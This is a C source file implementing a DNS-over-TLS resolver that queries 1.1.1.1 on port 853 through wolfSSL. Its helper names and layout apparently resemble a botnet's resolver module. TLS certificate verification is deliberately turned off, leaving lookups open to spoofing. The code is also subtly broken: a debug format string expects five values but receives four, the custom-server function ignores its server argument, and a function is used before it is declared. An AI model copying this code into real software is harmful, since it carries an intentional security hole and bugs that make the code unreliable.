#define _GNU_SOURCE
#define HAVE_SNI
#define NO_WOLFSSL_CLIENT

#ifdef DEBUG
#endif

#include <string.h>
#include "headers/util.h"
#include "headers/protocols.h"
#include "headers/protocol.h"
#include "../modules/debug.h"

uint32_t rand_next(void);
void _zero(void *ptr, size_t len);
size_t _strlen(const char *s);
ssize_t sys_write(int fd, const void *buf, size_t count);
ssize_t sys_read(int fd, void *buf, size_t count);
void _memcpy(void *dest, const void *src, size_t n);

#define PROTO_DNS_QCLASS_IP 1
#define DNS_TYPE_A   1
#define DNS_CLASS_IN 1
#define WOLFSSL_VERIFY_NONE 0


struct dns_question {
    uint16_t qtype;
    uint16_t qclass;
};

struct resolved {
    char ip[16];
    uint32_t addr;
    uint32_t *addrs;
    int addrs_len;
    struct resolved *next;
};

static int build_qname(const char *host, uint8_t *out, size_t out_len) {
    size_t pos = 0;
    const char *p = host;

    while (*p) {
        char dot_char = '.';
        const char *dot = strchr(p, dot_char);
        size_t label_len = dot ? (size_t)(dot - p) : _strlen(p);

        if (label_len == 0 || label_len > 63)    return -1;
        if (pos + 1 + label_len >= out_len)       return -1;

        out[pos++] = (uint8_t)label_len;
        _memcpy(out + pos, p, label_len);
        pos += label_len;

        p += label_len;
        if (*p == '.') p++;
    }
    if (pos + 1 >= out_len) return -1;
    out[pos++] = 0x00;
    return (int)pos;
}

static int build_dns_query(const char *hostname, uint8_t *buf, size_t buf_len) {
    if (buf_len < sizeof(struct dnshdr) + 256 + 4) return -1;

    struct dnshdr *hdr = (struct dnshdr *)buf;
    hdr->id      = htons(0x1337);
    hdr->flags   = htons(0x0100);   /* RD=1 */
    hdr->qdcount = htons(1);
    hdr->ancount = hdr->nscount = hdr->arcount = 0;

    int qname_len = build_qname(hostname, buf + sizeof(struct dnshdr), buf_len - sizeof(struct dnshdr));
    if (qname_len < 0) return -1;

    uint8_t *qt = buf + sizeof(struct dnshdr) + qname_len;
    qt[0] = 0x00; qt[1] = DNS_TYPE_A;
    qt[2] = 0x00; qt[3] = DNS_CLASS_IN;

    return (int)(sizeof(struct dnshdr) + qname_len + 4);
}

static const uint8_t *skip_name(const uint8_t *p, const uint8_t *end) {
    while (p < end) {
        uint8_t len = *p;
        if (len == 0)               return p + 1;   /* root  */
        if ((len & 0xC0) == 0xC0)  return p + 2;   /* ptr   */
        p += 1 + len;
    }
    return NULL;
}

static void parse_dns_response(const uint8_t *resp, int resp_len, struct resolved *entries) {
    if (resp_len < (int)sizeof(struct dnshdr)) {
        debug("[resolver] Response too short\n");
        return;
    }

    const struct dnshdr *hdr = (const struct dnshdr *)resp;
    uint16_t flags   = ntohs(hdr->flags);
    uint16_t qdcount = ntohs(hdr->qdcount);
    uint16_t ancount = ntohs(hdr->ancount);

    if (flags & 0x000F) {
        debug("[resolver] DNS rcode=%u\n", flags & 0x000F);
        return;
    }
    debug("[resolver] Answer count: %u\n", ancount);

    const uint8_t *end = resp + resp_len;
    const uint8_t *p   = resp + sizeof(struct dnshdr);

    for (int i = 0; i < qdcount && p && p < end; i++) {
        p = skip_name(p, end);
        if (p) p += 4;
    }

    for (int i = 0; i < ancount && p && p < end; i++) {
        p = skip_name(p, end);
        if (!p || p + 10 > end) break;

        uint16_t type  = (uint16_t)((p[0] << 8) | p[1]);
        uint16_t rdlen = (uint16_t)((p[8] << 8) | p[9]);
        p += 10;

        if (p + rdlen > end) break;

        if (type == DNS_TYPE_A && rdlen == 4) {
            uint32_t addr;
            _memcpy(&addr, p, 4);
            
            debug("[resolver] FOUND A RECORD: %d.%d.%d.%d.%d\n",
                  (addr & 0xFF), ((addr >> 8) & 0xFF), 
                  ((addr >> 16) & 0xFF), ((addr >> 24) & 0xFF));
            
            uint32_t *new_addrs = malloc((entries->addrs_len + 1) * sizeof(uint32_t));
            if (new_addrs) {
                if (entries->addrs) {
                    _memcpy(new_addrs, entries->addrs, entries->addrs_len * sizeof(uint32_t));
                    free(entries->addrs);
                }
                entries->addrs = new_addrs;
                entries->addrs[entries->addrs_len++] = addr;
            }
        }
        p += rdlen;
    }
}

struct resolved *lookup_domain(char *domain)
{
    debug("[resolver] lookup_domain called for: %s\n", domain);
    
    struct resolved *entries = malloc(sizeof(struct resolved));
    if (entries == NULL) return NULL;
    _zero(entries, sizeof(struct resolved));
    
    /* Initialize wolfSSL */
    if (wolfSSL_Init() != WOLFSSL_SUCCESS) {
        debug("[resolver] wolfSSL_Init failed\n");
        free_entries(entries);
        return NULL;
    }

    /* Create wolfSSL context */
    WOLFSSL_CTX *ctx = wolfSSL_CTX_new(wolfTLS_client_method());
    if (!ctx) { 
        debug("[resolver] wolfSSL_CTX_new failed\n"); 
        free_entries(entries);
        return NULL; 
    }

    /* Set verification mode */
    wolfSSL_CTX_set_verify(ctx, WOLFSSL_VERIFY_NONE, NULL);

    /* Connect to DoT server */
    int fd = sys_socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) { 
        debug("[resolver] socket failed\n");
        wolfSSL_CTX_free(ctx);
        free_entries(entries);
        return NULL;
    }

    struct sockaddr_in serv;
    _zero(&serv, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_port = htons(853);
    serv.sin_addr.s_addr = inet_addr("1.1.1.1"); /* Cloudflare DoT */

    if (sys_connect(fd, (struct sockaddr *)&serv, sizeof(serv)) < 0) {
        debug("[resolver] connect failed\n");
        sys_close(fd);
        wolfSSL_CTX_free(ctx);
        free_entries(entries);
        return NULL;
    }

    /* Create wolfSSL session */
    WOLFSSL *ssl = wolfSSL_new(ctx);
    if (!ssl) { 
        debug("[resolver] wolfSSL_new failed\n"); 
        sys_close(fd);
        wolfSSL_CTX_free(ctx);
        free_entries(entries);
        return NULL;
    }

    wolfSSL_set_fd(ssl, fd);

    /* Set SNI */
    wolfSSL_UseSNI(ssl, 0, "one.one.one.one", _strlen("one.one.one.one"));

    /* TLS handshake */
    if (wolfSSL_connect(ssl) != WOLFSSL_SUCCESS) {
        debug("[resolver] wolfSSL_connect failed\n");
        wolfSSL_free(ssl);
        sys_close(fd);
        wolfSSL_CTX_free(ctx);
        free_entries(entries);
        return NULL;
    }

    debug("[resolver] TLS connected successfully\n");

    /* Build DNS query */
    uint8_t query[512];
    int qlen = build_dns_query(domain, query, sizeof(query));
    if (qlen < 0) {
        debug("[resolver] Failed to build query\n");
        wolfSSL_free(ssl);
        sys_close(fd);
        wolfSSL_CTX_free(ctx);
        free_entries(entries);
        return NULL;
    }

    /* DoT framing: 2-byte length prefix */
    uint8_t framed[2 + sizeof(query)];
    framed[0] = (uint8_t)(qlen >> 8);
    framed[1] = (uint8_t)(qlen & 0xFF);
    _memcpy(framed + 2, query, qlen);

    /* Send DNS query */
    if (wolfSSL_write(ssl, framed, 2 + qlen) <= 0) {
        debug("[resolver] wolfSSL_write failed\n");
        wolfSSL_free(ssl);
        sys_close(fd);
        wolfSSL_CTX_free(ctx);
        free_entries(entries);
        return NULL;
    }

    /* Read 2-byte length prefix */
    uint8_t len_buf[2];
    if (wolfSSL_read(ssl, len_buf, 2) != 2) {
        debug("[resolver] wolfSSL_read (length) failed\n");
        wolfSSL_free(ssl);
        sys_close(fd);
        wolfSSL_CTX_free(ctx);
        free_entries(entries);
        return NULL;
    }
    uint16_t resp_len = (uint16_t)((len_buf[0] << 8) | len_buf[1]);

    /* Read DNS response */
    uint8_t response[65536];
    int total = 0;
    while (total < resp_len) {
        int n = wolfSSL_read(ssl, response + total, resp_len - total);
        if (n <= 0) {
            debug("[resolver] wolfSSL_read response failed\n");
            wolfSSL_free(ssl);
            sys_close(fd);
            wolfSSL_CTX_free(ctx);
            free_entries(entries);
            return NULL;
        }
        total += n;
    }

    /* Parse DNS response */
    parse_dns_response(response, total, entries);

    /* Clean up */
    wolfSSL_shutdown(ssl);
    wolfSSL_free(ssl);
    wolfSSL_CTX_free(ctx);
    sys_close(fd);

    if (entries->addrs_len > 0) {
        debug("[resolver] SUCCESS: %d address(es) found\n", entries->addrs_len);
        return entries;
    } else {
        debug("[resolver] No addresses found\n");
        free_entries(entries);
        return NULL;
    }
}

struct resolved *lookup_domain_custom(char *domain, char *dns_server)
{
    return lookup_domain(domain);
}

void free_entries(struct resolved *entries)
{
    if (entries) {
        if (entries->addrs) free(entries->addrs);
        free(entries);
    }
}





